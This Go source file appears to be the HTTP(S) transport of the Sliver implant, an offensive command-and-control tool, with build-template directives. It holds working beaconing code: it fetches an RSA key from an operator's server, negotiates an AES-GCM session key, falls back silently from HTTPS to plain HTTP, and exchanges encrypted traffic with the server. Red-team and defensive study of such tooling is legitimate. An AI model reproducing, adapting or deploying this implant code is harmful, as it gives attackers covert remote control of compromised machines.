package transports

// {{if .HTTPServer}}

import (
	"bytes"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"strings"

	// {{if .Debug}}
	"log"
	// {{end}}

	"net"
	"net/http"
	"net/url"
	"path"
	"time"

	pb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

const (
	defaultTimeout    = time.Second * 10
	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
)

// HTTPStartSession - Attempts to start a session with a given address
func HTTPStartSession(address string) (*SliverHTTPClient, error) {
	var client *SliverHTTPClient
	client = httpsClient(address)
	err := client.SessionInit()
	if err != nil {
		// If we're using default ports then switch to 80
		if strings.HasSuffix(address, ":443") {
			address = fmt.Sprintf("%s:80", address[:len(address)-4])
		}
		client = httpClient(address) // Fallback to insecure HTTP
		err = client.SessionInit()
		if err != nil {
			return nil, err
		}
	}
	return client, nil
}

// SliverHTTPClient - Helper struct to keep everything together
type SliverHTTPClient struct {
	Origin     string
	Client     *http.Client
	SessionKey *AESKey
	SessionID  string
}

// SessionInit - Initailize the session
func (s *SliverHTTPClient) SessionInit() error {
	publicKey := s.getPublicKey()
	if publicKey == nil {
		// {{if .Debug}}
		log.Printf("Invalid public key")
		// {{end}}
		return errors.New("error")
	}
	skey := RandomAESKey()
	s.SessionKey = &skey
	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("RSA encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.getSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", s.Origin), nil)
	resp, err := s.Client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		// {{if .Debug}}
		log.Printf("Failed to fetch server public key")
		// {{end}}
		return nil
	}
	data, _ := ioutil.ReadAll(resp.Body)
	pubKeyBlock, _ := pem.Decode(data)
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		// {{if .Debug}}
		log.Printf("[http] Go a valid public key")
		// {{end}}
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
	uri := s.toURL("/start")
	req, _ := http.NewRequest("POST", uri, reader)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		return err
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
	if err != nil {
		return err
	}
	s.SessionID = string(sessionID)
	return nil
}

// Get - Perform an HTTP GET request
func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
	if s.SessionID == "" || s.SessionKey == nil {
		return nil, errors.New("no session")
	}
	uri := s.toURL(urlPath)
	req, _ := http.NewRequest("GET", uri, nil)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("Non-200 response code")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	return GCMDecrypt(*s.SessionKey, respData)
}

// Post - Perform an HTTP POST request
func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
	if s.SessionID == "" || s.SessionKey == nil {
		return nil, errors.New("no session")
	}
	reqData, err := GCMEncrypt(*s.SessionKey, data)
	reader := bytes.NewReader(reqData)
	uri := s.toURL(urlPath)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	req, _ := http.NewRequest("POST", uri, reader)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] POST failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New("Non-200 response code")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	return GCMDecrypt(*s.SessionKey, respData)
}

func (s *SliverHTTPClient) toURL(urlPath string) string {
	curl, _ := url.Parse(s.Origin)
	curl.Path = path.Join(curl.Path, urlPath)
	q := curl.Query()
	q.Set("sessionid", s.SessionID)
	curl.RawQuery = q.Encode()
	return curl.String()
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string) *SliverHTTPClient {
	return &SliverHTTPClient{
		Origin: fmt.Sprintf("http://%s", address),
		Client: &http.Client{
			Timeout: defaultReqTimeout,
		},
	}
}

func httpsClient(address string) *SliverHTTPClient {
	var netTransport = &http.Transport{
		Dial: (&net.Dialer{
			Timeout: defaultTimeout,
		}).Dial,
		TLSHandshakeTimeout: defaultTimeout,
	}
	return &SliverHTTPClient{
		Origin: fmt.Sprintf("https://%s", address),
		Client: &http.Client{
			Timeout:   defaultReqTimeout,
			Transport: netTransport,
		},
	}
}

// {{end}} -HTTPServer
